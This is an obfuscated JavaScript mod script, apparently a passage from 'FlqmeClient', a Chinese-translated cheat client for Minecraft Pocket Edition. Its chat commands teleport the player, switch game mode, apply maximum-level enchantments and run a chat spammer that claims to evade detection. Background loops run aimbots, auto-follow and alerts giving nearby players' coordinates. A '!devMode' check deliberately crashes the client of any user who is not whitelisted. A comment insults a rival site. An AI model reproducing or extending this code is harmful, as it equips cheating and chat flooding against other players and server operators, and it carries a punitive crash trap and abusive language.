            clientMessage(fct + '!tp > 设置坐标来传送自己 > 使用: !tp <x> <y> <z>');
            clientMessage(fct + '!theme > 改变主题 > 使用: !theme <flqme/infqrno>');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == '5') {
            clientMessage(fct + '帮助页码: 5/5');
            clientMessage(fct + '可用命令: ');
            clientMessage(fct + '!search > 搜索给定文本(百度) > 使用: !search <text>');
            clientMessage(fct + '!fe > 强迫附魔手中的物品 > 使用: !fe <sword/bow/tool/armor>');
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!glidespeed') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '把数字放在!glidespeed后面. 例如: !glidespeed 5 将把滑行速度设置为0.5');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null && _0x2bf6x1a7[1] != 'default') {
            glideSpeed = _0x2bf6x1a7[1] * 0.1;
            clientMessage(fct + '滑行速度被设定为: ' + _0x2bf6x1a7[1] * 0.1);
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == 'default') {
            glideSpeed = 0.3;
            clientMessage(fct + '滑行速度设置为默认');
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!setfov') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '把一个数字放在!setfov后面. 例如: !setfov 15 将会把视角变为15');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null && _0x2bf6x1a7[1] != 'default') {
            ModPE['setFov'](_0x2bf6x1a7[1]);
            clientMessage(fct + '视角设置为: ' + _0x2bf6x1a7[1]);
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == 'default') {
            ModPE['resetFov']();
            clientMessage(fct + '视角设置为默认');
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!setspeed') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '把一个数字放在!setspeed后面. 例如: !setspeed 50 将会把游戏速度设置为50');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null && _0x2bf6x1a7[1] != 'default') {
            ModPE['setGameSpeed'](_0x2bf6x1a7[1]);
            clientMessage(fct + '游戏速度设置为: ' + _0x2bf6x1a7[1]);
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == 'default') {
            ModPE['setGameSpeed'](20);
            clientMessage(fct + '游戏速度已设置为默认');
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!gamemode') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '使用模式切换指令!gamemode. 例如: !gamemode creative 或者 !gamemode 1 将会把你的模式设置为创造');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            var _0x2bf6x1a8;
            if (_0x2bf6x1a7[1] == '1') {
                _0x2bf6x1a8 = 1
            } else {
                if (_0x2bf6x1a7[1] == 'creative') {
                    _0x2bf6x1a8 = 1
                } else {
                    if (_0x2bf6x1a7[1] == '0') {
                        _0x2bf6x1a8 = 0
                    } else {
                        if (_0x2bf6x1a7[1] == 'survival') {
                            _0x2bf6x1a8 = 0
                        } else {
                            if (_0x2bf6x1a7[1] == '2') {
                                _0x2bf6x1a8 = 2
                            } else {
                                if (_0x2bf6x1a7[1] == 'adventure') {
                                    _0x2bf6x1a8 = 2
                                } else {
                                    if (_0x2bf6x1a7[1] == '3') {
                                        _0x2bf6x1a8 = 3
                                    } else {
                                        if (_0x2bf6x1a7[1] == 'spectator') {
                                            _0x2bf6x1a8 = 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            };
            Level['setGameMode'](_0x2bf6x1a8);
            clientMessage(fct + '游戏模式设置为: ' + _0x2bf6x1a7[1]);
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!vclip') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '放一个数字在!vclip后面. 例如: !vclip -5 将传送你-5个坐标');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            preventDefault();
            if (_0x2bf6x25['charAt'](8) == '-') {
                var _0x2bf6x1a9 = Utils['Text']['replaceAll']('-', '', _0x2bf6x1a7[1]);
                Entity['setPosition'](getPlayerEnt(), getPlayerX(), getPlayerY() - _0x2bf6x1a9, getPlayerZ());
                clientMessage(fct + 'Teleported ' + _0x2bf6x1a7[1] + ' blocks')
            } else {
                if (_0x2bf6x25['charAt'](8) != '-') {
                    Entity['setPositionRelative'](getPlayerEnt(), 0, +_0x2bf6x1a7[1], 0);
                    clientMessage(fct + 'Teleported ' + _0x2bf6x1a7[1] + ' blocks')
                }
            }
        }
    };
    if (_0x2bf6x1a7[0] == '!team') {
        if (_0x2bf6x1a7[1] == null || _0x2bf6x1a7[2] == null) {
            clientMessage(fct + '输入玩家名称在!team后面即可');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null && _0x2bf6x1a7[2] != null) {
            if (_0x2bf6x1a7[1] == 'add') {
                team['push'](_0x2bf6x1a7[2]);
                clientMessage(fct + 'Added ' + _0x2bf6x1a7[2] + ' 你的队友')
            };
            preventDefault()
        };
        if (_0x2bf6x1a7[1] == 'remove' && _0x2bf6x1a7[2] != '随枫吖') {
            for (i = 0; i < team['length']; i++) {
                if (team[i] == _0x2bf6x1a7[2]) {
                    team['splice'](i, 1);
                    clientMessage(fct + 'Removed ' + _0x2bf6x1a7[2] + ' 你的队友')
                }
            };
            if (_0x2bf6x1a7[2] == '随枫吖') {
                clientMessage(fct + '你不能删除队友')
            };
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!teamlist') {
        clientMessage(fct + '队伍玩家列表: ' + team);
        preventDefault()
    };
    if (_0x2bf6x1a7[0] == '!spam') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '放入本文在!spam后面(自动绕过检测). 例如: !spam void 将会一直刷void这条消息');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            spamText = _0x2bf6x1a7[1];
            clientMessage(fct + '刷屏消息设置为: ' + _0x2bf6x1a7[1]);
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!spamdelay') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '放一个数字在!spamdelay后面. 例如: !spamdelay 3.5 将会是刷屏速度设置为3.5秒');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            spamDelay = _0x2bf6x1a7[1] * 1000;
            if (_0x2bf6x1a7[1] == 1) {
                clientMessage(fct + '刷屏速度设置为: 1秒');
                preventDefault()
            } else {
                clientMessage(fct + '刷屏速度设置为: ' + _0x2bf6x1a7[1] + ' 秒');
                preventDefault()
            }
        }
    };
    if (_0x2bf6x1a7[0] == '!acspeed') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '放一个数字在!acspeed后面. 例如: !acspeed 5 将自动爬行速度设置为5');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            acspd = _0x2bf6x1a7[1] * 0.1;
            clientMessage(fct + '自动爬行速度设置为: ' + _0x2bf6x1a7[1] * 0.1);
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!devMode') {
        if (canBeDev == true && Entity['getNameTag'](getPlayerEnt()) == 'FirePro9978' || Entity['getNameTag'](getPlayerEnt()) == 'NNeBBuRR') {
            isDev = true;
            preventDefault();
            fctoast('开发模式启用！')
        } else {
            ccrash();
            fctoast('您正在尝试访问开发模式。崩溃的客户端...');
            preventDefault()
        }
    };
    if (_0x2bf6x1a7[0] == '!nwrange') {
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '放一个数字在!nwrange后面. 例如: !nwrange 10 将会把玩家信息显示范围设置为10');
            preventDefault()
        };
        if (_0x2bf6x1a7[1] != null) {
            nwrange = _0x2bf6x1a7[1];
            clientMessage(fct + '玩家信息范围设置为: ' + _0x2bf6x1a7[1]);
            preventDefault()
        }
    };
    if (leetspeakss) {
        if (_0x2bf6x25['charAt'](0) != '!' && _0x2bf6x25['charAt'](0) != '/') {
            Server['sendChat'](' ' + convertToLeet(_0x2bf6x25))
        };
        preventDefault();
        com['mojang']['minecraftpe']['MainActivity']['currentMainActivity']['get']()['updateTextboxText']('')
    };
    if (_0x2bf6x1a7[0] == '!freeze') {
        if (_0x2bf6x1a7[1] == 'on') {
            Entity['setImmobile'](getPlayerEnt(), true);
            clientMessage(fct + '你现在都冻结了！')
        };
        if (_0x2bf6x1a7[1] == 'off') {
            Entity['setImmobile'](getPlayerEnt(), false);
            clientMessage(fct + '你现在可以移动了！')
        };
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '在!freeze后面放入on或者off来开启. 例如: !freeze on 将会让你不能动!freeze off则相反')
        }
    };
    if (_0x2bf6x1a7[0] == '!info') {
        clientMessage(fct + 'FlqmeClient: Alpha 6');
        clientMessage(fct + 'Flqme made by FirePro9978');
        clientMessage(fct + 'Translator:随枫吖');
        clientMessage(fct + 'Code Developers: NNeBBuRR, Hacker Lastaad, ArceusMatt, JohnMacroCraft');
        clientMessage(fct + 'Testers: MadMinerYT, AmayMask, Affann, iTzPurple, Smasher565, QuinnMakkinje, ImBannable, RealMCPvPER, KaosUlt, DinosaurusRex02');
        clientMessage(fct + 'Special Thanks to GodSoft029, Peacestorm, Apric0cks, NSITF MCPE, Pokey, SoloTroll and Purple xKai');
        clientMessage(fct + 'Contact us: Kik @FirePro9978, Email: coolpro9978@gmail.com');
        clientMessage(fct + 'Other Recommended Clients: Charged, GravePE, Nuke, Crimson, CyberZ, PokeyHack, Storm, NEB, SmashHaxPE, Flame, DragOP, Cloud, Xive, Hydom, Quvon, Vertex');
        fctoast('BehindHit and Escape idea was from Hacker Lastaad');
        fctoast('FallBack and CrouchSpeed Code was from NNeBBuRR')
    };
    if (_0x2bf6x1a7[0] == '!tp') {
        if (_0x2bf6x1a7[1] == null || _0x2bf6x1a7[2] == null || _0x2bf6x1a7[3] == null) {
            clientMessage(fct + '把坐标位置放在!tp后面. 例如: !tp 1 2 3 将会把你传送到x:1 y:2 z:3')
        };
        if (_0x2bf6x1a7[1] != null || _0x2bf6x1a7[2] != null || _0x2bf6x1a7[3] != null) {
            setPosition(getPlayerEnt(), _0x2bf6x1a7[1], _0x2bf6x1a7[2], _0x2bf6x1a7[3]);
            clientMessage(fct + '成功地传送到: X: ' + _0x2bf6x1a7[1] + ' Y: ' + _0x2bf6x1a7[2] + ' Z: ' + _0x2bf6x1a7[3])
        }
    };
    if (_0x2bf6x1a7[0] == '!theme') {
        if (_0x2bf6x1a7[1] == 'flqme') {
            theme = nbg;
            theme1 = mbg;
            module = nnbg;
            clientMessage(fct + '成功地改变为Floqme主题！')
        };
        if (_0x2bf6x1a7[1] == 'infqrno') {
            theme = iibg;
            theme1 = fbg;
            module = ibg;
            clientMessage(fct + '成功地改变为Infqrno主题！')
        };
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '主题:Floqme，Infqrno')
        }
    };
    if (_0x2bf6x1a7[0] == '!search') {
        var _0x2bf6x1aa = _0x2bf6x1a7[1];
        ctx['runOnUiThread'](new java['lang'].Runnable({
            run: function() {
                var _0x2bf6x1ab = new android['webkit'].WebView(ctx);
                var _0x2bf6x1ac = _0x2bf6x1ab['getSettings']();
                _0x2bf6x1ac['setJavaScriptEnabled'](true);
                _0x2bf6x1ab['setWebChromeClient'](new android['webkit'].WebChromeClient());
                _0x2bf6x1ab['setWebViewClient'](new android['webkit'].WebViewClient());
                _0x2bf6x1ab['loadUrl']('https://www.baidu.com/s?word=' + _0x2bf6x1aa);
                new android['app']['AlertDialog'].Builder(ctx)['setView'](_0x2bf6x1ab)['show']()
            }
        }))
    };
    if (_0x2bf6x1a7[0] == '!fe') {
        if (_0x2bf6x1a7[1] == 'sword') {
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.UNBREAKING, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.SHARPNESS, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.KNOCKBACK, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.FIRE_ASPECT, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.LOOTING, 32767);
            clientMessage(fct + '成功地附魔了剑')
        };
        if (_0x2bf6x1a7[1] == 'bow') {
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.UNBREAKING, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.POWER, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.INFINITY, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.FLAME, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.PUNCH, 32767);
            clientMessage(fct + '成功地附魔了弓')
        };
        if (_0x2bf6x1a7[1] == 'tool') {
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.UNBREAKING, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.FORTUNE, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.EFFICIENCY, 32767);
            clientMessage(fct + '成功地附魔了工具')
        };
        if (_0x2bf6x1a7[1] == 'armor') {
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.UNBREAKING, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.PROTECTION, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.FIRE_PROTECTION, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.PROJECTILE_PROTECTION, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.BLAST_PROTECTION, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.THORNS, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.DEPTH_STRIDER, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.AQUA_AFFINITY, 32767);
            Player['enchant'](Player['getSelectedSlotId'](), Enchantment.FEATHER_FALLING, 32767);
            clientMessage(fct + '成功地附魔了盔甲')
        };
        if (_0x2bf6x1a7[1] == null) {
            clientMessage(fct + '[超强附魔(32767)]sword(剑)  bow(弓)  tool(工具) armor(盔甲)放在!fe后面. 例如: !fe sword 将会得到一把很强的剑')
        }
    }
}

function ccrash() {
    c1()
}

function c1() {
    ctx['runOnUiThread'](new java['lang'].Runnable({
        run: function() {
            new android['os'].Handler()['postDelayed'](new java['lang'].Runnable({
                run: function() {
                    c2()
                }
            }), 500)
        }
    }))
}

function c2() {
    ctx['runOnUiThread'](new java['lang'].Runnable({
        run: function() {
            new android['os'].Handler()['postDelayed'](new java['lang'].Runnable({
                run: function() {
                    crash()
                }
            }), 1000)
        }
    }))
}

function fctoast(_0x2bf6x25, _0x2bf6x1b1) {
    try {
        var ctx = com['mojang']['minecraftpe']['MainActivity']['currentMainActivity']['get']();
        ctx['runOnUiThread'](new java['lang'].Runnable({
            run: function() {
                var _0x2bf6x1b2 = android['widget']['Toast']['makeText'](com['mojang']['minecraftpe']['MainActivity']['currentMainActivity']['get'](), '' + _0x2bf6x25, android['widget']['Toast'].LENGTH_LONG);
                var _0x2bf6x130 = new android['widget'].LinearLayout(ctx);
                var _0x2bf6x1b3 = new android['widget'].TextView(ctx);
                if (_0x2bf6x1b1 == null) {
                    _0x2bf6x25 = '随枫吖: ' + _0x2bf6x25
                } else {
                    _0x2bf6x25 = _0x2bf6x1b1 + ': ' + _0x2bf6x25
                };
                _0x2bf6x1b3['setText'](_0x2bf6x25);
                _0x2bf6x1b3['setGravity'](android['view']['Gravity'].CENTER);
                _0x2bf6x1b3['setTextSize'](15);
                _0x2bf6x1b3['setPadding'](10, 10, 10, 10);
                _0x2bf6x1b3['setTextColor'](android['graphics']['Color']['rgb'](255, 128, 0));
                var _0x2bf6x1b4 = new android['graphics']['drawable'].GradientDrawable();
                _0x2bf6x1b4['setColor'](android['graphics']['Color'].BLACK);
                _0x2bf6x1b4['setStroke'](5, android['graphics']['Color']['rgb'](255, 128, 0));
                _0x2bf6x130['addView'](_0x2bf6x1b3);
                _0x2bf6x130['setBackground'](_0x2bf6x1b4);
                _0x2bf6x130['getBackground']()['setAlpha'](150);
                _0x2bf6x1b2['setView'](_0x2bf6x130);
                _0x2bf6x1b2['show']()
            }
        }))
    } catch (e) {
        print(e)
    }
}

function convertToLeet(_0x2bf6x25) {
    var _0x2bf6x26 = _0x2bf6x25['toUpperCase']();
    var _0x2bf6x1b6 = new Array('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z');
    var _0x2bf6x1b7 = new Array('4', '8', '(', '|}', '3', '|=', 'G', '|-|', '1', '_|', '|<', '|_', '|^|', 'N', '0', '|)', 'Q', 'R', '5', '7', '|_|', 'V', 'W', 'X', 'Y', 'Z');
    for (i = 0; i < _0x2bf6x1b6['length']; i++) {
        _0x2bf6x26 = Utils['Text']['replaceAll'](_0x2bf6x1b6[i], _0x2bf6x1b7[i], _0x2bf6x26)
    };
    return _0x2bf6x26
}

function rptask() {
    ctx['runOnUiThread'](new java['lang'].Runnable({
        run: function() {
            new android['os'].Handler()['postDelayed'](new java['lang'].Runnable({
                run: function() {
                    if (aimbotss) {
                        if (Level['getGameMode']() == 1) {
                            _0x2bf6x166 = getNearestEntity(9)
                        } else {
                            _0x2bf6x166 = getNearestEntity(7)
                        };
                        if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                            aimAtEnt(_0x2bf6x166)
                        }
                    };
                    if (aimassistss) {
                        var _0x2bf6x166 = Player['getPointedEntity']();
                        if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                            aimAtEnt(_0x2bf6x166)
                        }
                    };
                    if (backfacess) {
                        var _0x2bf6x1b9 = getPlayerEnt();
                        var _0x2bf6x18c = Math['floor'](Entity['getYaw'](_0x2bf6x1b9));
                        var _0x2bf6x18d = Math['floor'](Entity['getPitch'](_0x2bf6x1b9));
                        if (_0x2bf6x18d <= 189) {
                            Entity['setRot'](_0x2bf6x1b9, _0x2bf6x18c, 192)
                        }
                    };
                    if (twerkss) {
                        tCounter++;
                        if (tCounter == 6) {
                            Entity['setSneaking'](Player['getEntity'](), 1)
                        };
                        if (tCounter == 11) {
                            Entity['setSneaking'](Player['getEntity'](), 0);
                            tCounter = 1
                        }
                    };
                    if (derpss) {
                        var _0x2bf6x1b9 = getPlayerEnt();
                        var _0x2bf6x18c = Math['floor'](Entity['getYaw'](_0x2bf6x1b9));
                        var _0x2bf6x18d = Math['floor'](Entity['getPitch'](_0x2bf6x1b9));
                        Entity['setRot'](_0x2bf6x1b9, _0x2bf6x18c + 30, _0x2bf6x18d)
                    };
                    if (followss) {
                        var _0x2bf6x166 = getNearestEntity(15);
                        if (Utils['Player']['isOnGround']() && getPlayerY() - Entity['getY'](_0x2bf6x166) < -0.8) {
                            setVelY(getPlayerEnt(), 0.4)
                        };
                        if (isDev == true) {
                            var _0x2bf6x1ba = getPlayerX();
                            var _0x2bf6x1bb = getPlayerZ();
                            var _0x2bf6x1bc = Entity['getX'](_0x2bf6x166);
                            var _0x2bf6x1bd = Entity['getZ'](_0x2bf6x166);
                            var _0x2bf6x168 = Math['sqrt'](Math['pow'](_0x2bf6x1ba - _0x2bf6x1bc, 2) + Math['pow'](_0x2bf6x1bb - _0x2bf6x1bd, 2));
                            if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                                setVelX(getPlayerEnt(), -Math['max'](-0.25, Math['min'](0.25, ((_0x2bf6x1ba - _0x2bf6x1bc) / _0x2bf6x168) / 4)));
                                setVelZ(getPlayerEnt(), -Math['max'](-0.25, Math['min'](0.25, ((_0x2bf6x1bb - _0x2bf6x1bd) / _0x2bf6x168) / 4)))
                            }
                        } else {
                            var _0x2bf6x13a = [0, 0, 0];
                            toDirectionalVector(_0x2bf6x13a, (getYaw() + 90) * Math['PI'] / 180, getPitch() * Math['PI'] / 180 * -1);
                            if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                                setVelX(getPlayerEnt(), 0.3 * _0x2bf6x13a[0]);
                                setVelZ(getPlayerEnt(), 0.3 * _0x2bf6x13a[2]);
                                aimAtEnt(_0x2bf6x166)
                            }
                        }
                    };
                    if (sniperss) {
                        var _0x2bf6x166 = getNearestEntity(100);
                        if (_0x2bf6x166 != null && Player['getCarriedItem']() == 261 && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                            bowAimAt(_0x2bf6x166);
                            ModPE['setFov'](13)
                        } else {
                            ModPE['resetFov']()
                        }
                    };
                    if (bowaimbotss && getCarriedItem() == 261) {
                        var _0x2bf6x166 = getNearestEntity(100);
                        if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                            bowAimAt(_0x2bf6x166)
                        }
                    };
                    nx = getPlayerX();
                    ny = getPlayerY();
                    nz = getPlayerZ();
                    eval(rptask())
                }
            }), 900 / 70)
        }
    }))
}
rptask();

function rptask2() {
    ctx['runOnUiThread'](new java['lang'].Runnable({
        run: function() {
            new android['os'].Handler()['postDelayed'](new java['lang'].Runnable({
                run: function() {
                    if (nearwarningss) {
                        var _0x2bf6x166 = getNearestEntity(nwrange);
                        if (_0x2bf6x166 != null && Player['getName'](_0x2bf6x166) != '' && Player['getName'](_0x2bf6x166) != ' ' && Player['getName'](_0x2bf6x166) != '  ' && isNotTeam(_0x2bf6x166)) {
                            var _0x2bf6x14a = removeColors(Entity['getNameTag'](_0x2bf6x166));
                            fctoast('
' + _0x2bf6x14a + '
' + 'x: ' + Math['floor'](Entity['getX'](_0x2bf6x166)) + '
' + ' y: ' + Math['floor'](Entity['getY'](_0x2bf6x166)) + '
' + ' z: ' + Math['floor'](Entity['getZ'](_0x2bf6x166)), '附近信息')
                        }
                    };
                    nx = getPlayerX();
                    ny = getPlayerY();
                    nz = getPlayerZ();
                    eval(rptask2())
                }
            }), 2500)
        }
    }))
}
rptask2();

function rptask3() {
    ctx['runOnUiThread'](new java['lang'].Runnable({
        run: function() {
            new android['os'].Handler()['postDelayed'](new java['lang'].Runnable({
                run: function() {
                    if (spamss) {
                        var _0x2bf6x1c0 = [' ', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
                        spamTime++;
                        ln++;
                        if (ln == 27) {
                            ln = 0
                        };
                        Server['sendChat'](_0x2bf6x1c0[ln] + '=' + spamTime + ' ' + spamText + ' ' + spamTime + '=' + _0x2bf6x1c0[ln])
                    };
                    nx = getPlayerX();
                    ny = getPlayerY();
                    nz = getPlayerZ();
                    eval(rptask3())
                }
            }), spamDelay)
        }
    }))
}
rptask3();

function leaveGame() {
    isDev = false;
    canBeDev = false;
    if (leaveG) {
        leaveG = false;
        fctoast('欢迎加入꯭꯭醉꯭仙꯭网꯭络꯭，群聊号码：716069766')
    };
    fctoast('您已离开服务器')
}


/*多玩狗理应死妈*/
/*这次就不加防葫芦代码了*/
/*如果发现葫芦侠盗js问题立刻加上*/
/*喷词基于贴吧*/
var base64 = "iVBORw0KGgoAAAANSUhEUgAAANIAAADSCAIAAACw+wkVAAAAA3NCSVQICAjb4U/gAAAgAElEQVR4nHy8WYxl2XUltvY+59zpzTFmREZkZdZclTVIJF1FslpuUS1TcFtufhiQAasNCfrw8GPYP/0hudst/ViGAQE2oG7BgAHDtCB3A01LakkWxLZMSS3RJKtIFauKWVWZWTlEZowvXrz5Tufs7Y8bkZWkqnQQeHgRcYd3z7DO2muv/Uj1/4CvK30yckmNjUqrGt6StaEjIq5eN8bADsuyXNJfe++DPFXXtU1ORWRR3FHVXnclS7PltAfAygYR+Vq998ZVURRFbnu5XA5PxoeHh7NZICIyGRFBHTODDABBICIARETBishiMS3Lcm0tvnbt2uomAKg5FBHR07OzMzbS6/Varc5isUiwvlgsWu56FEX/17/6s7W1tTSl5XLZ6biyLIvFqN1uX7tK6+vrLrs1mUzQWplOp09d+uzJyUkXL/zhH/7h2391sL29jdAbDoe7T19++PBhzqMvfvGLn/uJV4iojo9CCKX9s7quk/DFdrst5episYjTEQDyfSJiAjMzMmbOpSIi6BERJfFpVVWhmjjnoqirqj4MRKQKXQCeE2Z2YRpFUeVr772JLTN7TJk5zvTw+NBX883NzRW3WaMuAzGzUhsAYFTVBAfAagzAqBeROD4jssBHZSitGRpkC7wOgMAKFSVVZbYEIpBCFUFVCUJEBBCowF+cLc56rad66FVYF0iEjUWxiEwCgFABANUASAGg1DYRtdyHBIKe1nVNshNFkedVADVmABSqUCMDACoGgM2nkxBCMLkxRliIiMEEwqc0ESEiIvLez+fzuq4lUF3X+ZR6vR4RLRYLw1Gv1wPnk8lk/+Hds7OzB3uH+/v7ZWm63e5gdbvdbht2xhiQ8d6DQEQhhKIoWnHXWru2tlZV1dHRrTt37uxey65fv16G0+euPHfz4d2iKFxEk8lkNltc3b56elLUdc0xv/nmmwcHB3Ecx3HbGOO9T5LEUvvKlStra3lRFGqroiimi+OVlZXFYrFcLmNTjkajLMtUdTqZZFl2cnKSpmnaWknTtKoqETGR5nl+Vp1WVdU1U2utVWFmIlLVx3tGVUVEVZsl1Pxa13VVFFVVheCYWRGa1QWguQgzq6qqPrqmQpnZSzmfz+fToTEm2epYWGZDRPqJowIYYy4+kq+kXC6X7OZJ4j91HCFA0/HUDLZCFDqcDk9OTspuJ1lP+GIaRFGE8MnXiaNYoQKp6srnsxBCbOs4jj/tvk2zOb2lRoFOoI5iAxCgBgTmAEaACsZAWtCA8jl4z65UiK9Cvijm0xoAtduxW1m7/OxsNpvPEccradqZzhZ3793b29srlq00TTudSy+9tBskKstysSiPDkftTr8sS+fcYDBI4lZVVcbwykrbVuV4PKyNWVtb6z/5/P7+/smDe39x8P9d2oklv5911qan8zhmY/Dii88Ph9MY7fXNy/ky/va3vmfcJUE0WtSrq6v7xwcbGytXnnsp6XROcbTwi2o0JVoXmJXei4uxBHSs3Tk4UFNlUreyWEXEaxlqjaNqVhz3154+PT0lKup6WhSTuq59MgHHhmYmlOAlASCjgJIXItIOEYl3ADcjKWJDMN5HRORMBGPIWGZmboa5JpBjq6IIbJgNubqulRIbZxpISlssTZlb8QnbhAOFEEwUN3NaVQH+eCQ5Ug0imar60KkrRqgkuCiLAYAIqlBAFcogUhEiwjnKqECai1Z5u1gsloj8ejtBGrQORMyReGkmTHMzAKoMwEAVSrCq3gfrPRxHqrFqAgBMCiUwVCl0AASeA7DNWg8hNmTkfNarQMynT1VmJmvjOO50OszcbrejKBoOh9babrcL4ODg4N69e8v8rNvtDnobqhqCVFWl4CiK0rTDzLN5HkURM4tIURSqSoyqqlik1WqFEGazmYt4ZWUlycrZbDafz95///3Snzz55JPW4umnnz47O4uiaDldGmN+8N7R/v7+tSd3vPeOohDC1tbWZDI5PDz85je/qWa4u7t7dPpulmX50n/zm9987fm/+/zzz9/+7u2iKD77/Gs3btxYX9koy9IY45w7Hu6//PLLcRxba1XVOdexHVXtum4UReTP+cD5cDadpno+kBeNiIwxURSRJMaY2MVEpGQ+Pr55YYQQRMQYAyCEICzMTMZ2Oh1iGQwGiU0IFELw3pvokwclhKCqDXxZa5MkIZs65z4FpD5uzWR89OtgMCCiLFq1sA0WnkP4p2yAXj0ARxxHsaN2XdcW7vFnbN483i0AbGK+DA21PoPAwgNVZRoREWFBEDKnxEY5Ryg1eFXPAiKKonYWd7IkEhGi7mIaJAxMlE7n7sGDB8OTEXOrOxhYa6cjZWYmG8dGiUIItQ8iNTMPBgNRPT09FZHBYGCdWSwWeX3W7XZJs9lsVk45y7J2umOpGE/3V1dXF9XgX//ut37hF/9hEl05yffa2erGVvv9999/9+37WxvPjSZVwPLFqzsf3b+/CNJut9vplUvPXQ7IXbs9aK+1Wq2d9SsffPDB7Yfztz/4gT1jNZePjubO9SeTcb/fny3ud9rrqcP1V558cPKBdTZC1k7ixF0jIhfWrLogRDBBGq7DAGAqACoEhXGeiNQ3I5oRO2vjKIoYKYCgkYgIeVVV45lZPWkIJIwABIcQDOCQErlBF/1so9vpOnRLX2oJx2wkAqCoVRVogMIDCGoBELWJiPhyxGJ4w8IupZkEBFXSAFVSJpBlo6oqKqoAN8SJmQbR9d6GGLQJ5NURHIhCCIYUgJIAIIkAQB0AJgkSPMUGJnI2tkF8R4UUCQBI3HBHAKQMQDkAsIABUYP7zax8fMn+zWaMqeu6KIrmsCRJQHFZlp3B4MGDB3c+muZ53so6SZIU1Xw0Gq10n/DeS0AIQZuZbq21tizLyWSiQJIkqjqfz9lQkiQkZrlckkoURa2sxcxVPffeb21t3bx584VXrnzhC1/4tV/7tV/8xV/8whe+cHBwUPLi0qVLN29+XVWfeenzs9nszp07ly5d2un14zjePzysqmpv//b9+/c3tjVNU+Pd2traizsvDofDG99/j5mdc+vr6yeHdxtadvv27Z/9hS91Op2z0cO1tTUSJiITxyKiXquqIo2stbVqw6V+pLsecbVHrTnAew8gwIhIIG1